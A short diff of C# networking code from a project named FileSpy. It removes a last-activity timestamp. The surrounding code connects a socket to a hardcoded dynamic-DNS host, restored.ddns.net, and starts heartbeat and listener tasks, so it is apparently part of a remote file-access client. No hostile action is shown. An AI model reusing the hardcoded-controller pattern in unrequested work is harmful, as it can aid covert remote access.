@@ -18,8 +18,6 @@ namespace FileSpy.Classes
         Socket Client;
         SettingsClass Settings;
 
-        DateTime LastTime;
-
         public delegate void MessageHandler(MessageClass message);
         public event MessageHandler AcceptMessage;
 
@@ -51,7 +49,6 @@ namespace FileSpy.Classes
                         Client.Connect("restored.ddns.net", 6000);
                         //Client.Connect(IPAddress.Parse("192.168.1.65"), 6000);
                         Connected = true;
-                        LastTime = DateTime.Now;
                         Task.Run(Pulsar);
                         Task.Run(Listener);
 
@@ -80,7 +77,6 @@ namespace FileSpy.Classes
                     if (Client.Available > 0)
                     {
                         AcceptMessage(ReciveMessage());
-                        LastTime = DateTime.Now;
                     }
                     else
                     {
@@ -104,7 +100,6 @@ namespace FileSpy.Classes
             try
             {
                 Client.Send(buffer);
-                LastTime = DateTime.Now;
             }
             catch (Exception e)
             {
